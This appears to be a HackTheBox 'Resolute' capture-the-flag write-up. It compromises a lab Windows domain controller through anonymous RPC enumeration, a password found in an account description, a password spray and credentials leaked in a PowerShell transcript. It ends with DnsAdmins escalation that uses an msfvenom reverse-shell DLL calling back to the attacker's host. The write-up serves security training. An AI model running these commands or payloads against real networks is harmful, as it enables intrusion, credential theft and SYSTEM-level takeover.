---
description: Resolute box from HackTheBox write up.
---

# Resolute

## Nmap

Time for the typical Nmap scan!

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 1500 -p- 10.10.10.169
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-21 07:54 EST
Nmap scan report for 10.10.10.169
Host is up (0.050s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49682/tcp open  unknown
49923/tcp open  unknown
60062/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.86 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.10.169
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-21 08:02 EST
Nmap scan report for 10.10.10.169
Host is up (0.050s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-11-21 13:09:16Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h47m05s, deviation: 4h37m10s, median: 7m03s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2022-11-21T05:09:26-08:00
| smb2-time: 
|   date: 2022-11-21T13:09:25
|_  start_date: 2022-11-20T20:49:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.79 seconds
```

We have a Windows machine that looks like a domain controller. We have some domain information like the name of the domain: `megabank.local` which could be important if we want to login. I added it to my hosts file.

I will try to enumerate SMB first and then we could check MSRPC before trying to attack Kerberos.

## SMB

Using `enum4linux` I was able to get information about existing users and groups. I just let the relevant information here:

```bash
 ================================( Getting domain SID for 10.10.10.169 )================================

Domain Name: MEGABANK
Domain Sid: S-1-5-21-1392959593-3013219662-3596683436

[+] Host is part of a domain (not a workgroup)


 =======================================( Users on 10.10.10.169 )=======================================

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]


 ============================( Password Policy Information for 10.10.10.169 )============================



[+] Attaching to 10.10.10.169 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.10.169)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] MEGABANK
	[+] Builtin

[+] Password Info for Domain: MEGABANK

	[+] Minimum password length: 7
	[+] Password history length: 24
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 7


 =======================================( Groups on 10.10.10.169 )=======================================


[+] Getting builtin groups:

group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+]  Getting local groups:

group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting domain groups:

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]

[+]  Getting domain group memberships:

Group: 'Domain Admins' (RID: 512) has member: MEGABANK\Administrator
Group: 'Schema Admins' (RID: 518) has member: MEGABANK\Administrator
Group: 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
Group: 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group: 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
Group: 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group: 'Domain Users' (RID: 513) has member: MEGABANK\ryan
Group: 'Domain Users' (RID: 513) has member: MEGABANK\marko
Group: 'Domain Users' (RID: 513) has member: MEGABANK\sunita
Group: 'Domain Users' (RID: 513) has member: MEGABANK\abigail
Group: 'Domain Users' (RID: 513) has member: MEGABANK\marcus
Group: 'Domain Users' (RID: 513) has member: MEGABANK\sally
Group: 'Domain Users' (RID: 513) has member: MEGABANK\fred
Group: 'Domain Users' (RID: 513) has member: MEGABANK\angela
Group: 'Domain Users' (RID: 513) has member: MEGABANK\felicia
Group: 'Domain Users' (RID: 513) has member: MEGABANK\gustavo
Group: 'Domain Users' (RID: 513) has member: MEGABANK\ulf
Group: 'Domain Users' (RID: 513) has member: MEGABANK\stevie
Group: 'Domain Users' (RID: 513) has member: MEGABANK\claire
Group: 'Domain Users' (RID: 513) has member: MEGABANK\paulo
Group: 'Domain Users' (RID: 513) has member: MEGABANK\steve
Group: 'Domain Users' (RID: 513) has member: MEGABANK\annette
Group: 'Domain Users' (RID: 513) has member: MEGABANK\annika
Group: 'Domain Users' (RID: 513) has member: MEGABANK\per
Group: 'Domain Users' (RID: 513) has member: MEGABANK\claude
Group: 'Domain Users' (RID: 513) has member: MEGABANK\melanie
Group: 'Domain Users' (RID: 513) has member: MEGABANK\zach
Group: 'Domain Users' (RID: 513) has member: MEGABANK\simon
Group: 'Domain Users' (RID: 513) has member: MEGABANK\naoki
Group: 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
Group: 'Contractors' (RID: 1103) has member: MEGABANK\ryan
Group: 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator

 ==================( Users on 10.10.10.169 via RID cycling (RIDS: 500-550,1000-1050) )==================
```

There is no shares we can access so time to move on to MSRPC and see what we can see there. We have a list of users RIDs so maybe we can enumerate them.

## MSRPC

Using `rpcclient 10.10.10.169 -U '' -N` I was able to connect to the service and start querying information. I started by checking each user and after a while I got something insteresting when checking the user `marko`:

```
rpcclient $> queryuser 0x457
	User Name   :	marko
	Full Name   :	Marko Novak
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Account created. Password set to Welcome123!
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Fri, 27 Sep 2019 09:17:15 EDT
	Password can change Time :	Sat, 28 Sep 2019 09:17:15 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x457
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```

In the description I found what looks like a default password for new accounts: `Welcome123!`. I tried the password with `crackmapexec` but no luck, the thing is that maybe another user use this password.

### Password spray attack

I will try to spray the found password through all the users in the domain and pray:

```bash
┌──(kali㉿kali)-[~]
└─$ crackmapexec winrm -u /home/kali/Documents/HTB/Resolute/users.txt -p 'Welcome123!' -d MEGABANK 10.10.10.169
HTTP        10.10.10.169    5985   10.10.10.169     [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\Administrator:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\Guest:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\krbtgt:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\DefaultAccount:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\ryan:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\marko:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\sunita:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\abigail:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\marcus:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\sally:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\fred:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\angela:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\felicia:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\gustavo:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\ulf:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\stevie:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\claire:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\paulo:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\steve:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\annette:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\annika:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\per:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\claude:Welcome123!
WINRM       10.10.10.169    5985   10.10.10.169     [+] MEGABANK\melanie:Welcome123! (Pwn3d!)
```

Cool! We should be able to get a shell to the machine as `melanie` using `evil-winrm`. Another thing to note is that the system is not using Kerberos for authentication, just LDAP.

## Privilege escalation to `ryan`

Just using `evil-winrm` we can login to the victim host and get a shell. You can get the user flag from the `Desktop` directory.

```bash
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'     

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents>
```

At this point I started looking around and I found a hidden directory called `PSTranscripts`:

```powershell
*Evil-WinRM* PS C:\> ls -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-       11/20/2022   2:14 PM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-----       11/20/2022   2:12 PM                temp
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-       11/20/2022  12:48 PM      402653184 pagefile.sys
```

Inside it, I found what looks like a Powershell session transcript from `ryan`. Inside it we can find its credentials!

```powershell
...
cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
...
```

Now we can connect as `ryan` by also using `evil-winrm`.

## Time to pwn this

The first thing I found is this:

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> cat note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

Looks like the change we make to the machine are reverted every minute, good to know. Next, I checked the accound privileges:

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami -all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

What I noticed is that the user is part of `MEGABANK\DnsAdmins`, googling a bit I found [something we can use](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2){:target="_blank"}.

Basically, we should be able to inject a custom DLL into the DNS service. After that, we should restart the service and the DLL code will run with high privileges. Let's generate the payload:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Resolute]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=3333 -f dll> dns.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 8704 bytes
```

To pass the file to the target, I will use a SMB server with Samba. The box looks like has an AV in place so using this method I can easily share the DLL through the network without touching the disk (Avoiding the AV).

Time to get all working, I started a Netcat listener and then injected the DLL and restarted the service:

```powershell
*Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c "dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.2\public\dns.dll & sc stop dns & sc start dns"
```

As you can see we get a shell as `nt authority\system` and we can finally get the flag!

```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 3333
listening on [any] 3333 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.169] 50214
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
